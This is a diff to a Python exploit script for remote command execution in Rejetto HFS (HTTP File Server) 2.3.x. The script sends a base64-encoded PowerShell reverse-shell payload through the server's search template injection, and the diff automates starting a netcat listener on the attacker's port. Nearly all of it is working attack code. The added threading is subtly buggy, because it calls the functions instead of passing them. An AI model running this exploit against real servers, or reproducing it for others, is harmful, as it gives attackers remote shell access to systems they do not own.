@@ -1,6 +1,8 @@
+import threading
 import requests
 import argparse
 import base64
+import os
 
 class HFS():
     def __init__(self,target,lhost,lport):
@@ -8,7 +10,7 @@ class HFS():
         self.lhost = lhost
         self.lport = lport
         self.url = self.check_url()
-        self.nccheck()
+        self.execute_payload()
 
     def check_url(self):
         check = self.target[-1]
@@ -17,19 +19,6 @@ class HFS():
         else:
             fixed_url = self.target + "/"
             return fixed_url
-
-    def nccheck(self):
-        while True:
-            nc_check = input("Is netcat running? y or n? ")
-            if nc_check == 'y':
-                self.hfs_exploit()
-                break
-            elif nc_check == 'n':
-                print("Make sure netcat is running with nc -lvnp " + self.lport)
-                continue
-            else:
-                print("Incorrect Input. Only y or n are allowed.")
-                continue
 
     def hfs_exploit(self):
         print("Sending Payload!")
@@ -41,11 +30,25 @@ class HFS():
         $stream.Flush()};$client.Close()"""
 
         encoded_command = base64.b64encode(payload.encode("utf-16le")).decode()
-
-        full_payload = power_shell + encoded_command
+        full_payload = requests.utils.quote(power_shell + encoded_command)  
 
         full_url = self.url + "?search=%00{{.exec|" + full_payload + ".}}"
         requests.get(full_url)
+
+    def rev_shell(self):
+        print("Starting netcat on port " + self.lport)
+        net_cat = "nc -lvnp " + self.lport
+        os.system(net_cat)
+    
+    def execute_payload(self):
+        hfs_thread = threading.Thread(target=self.hfs_exploit())
+        rev_shell_thread = threading.Thread(target=self.rev_shell())
+
+        hfs_thread.start()
+        rev_shell_thread.start()
+
+        hfs_thread.join()
+        rev_shell_thread.join()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Rejetto HFS (HTTP File Server) 2.3.x - Remote Command Execution')
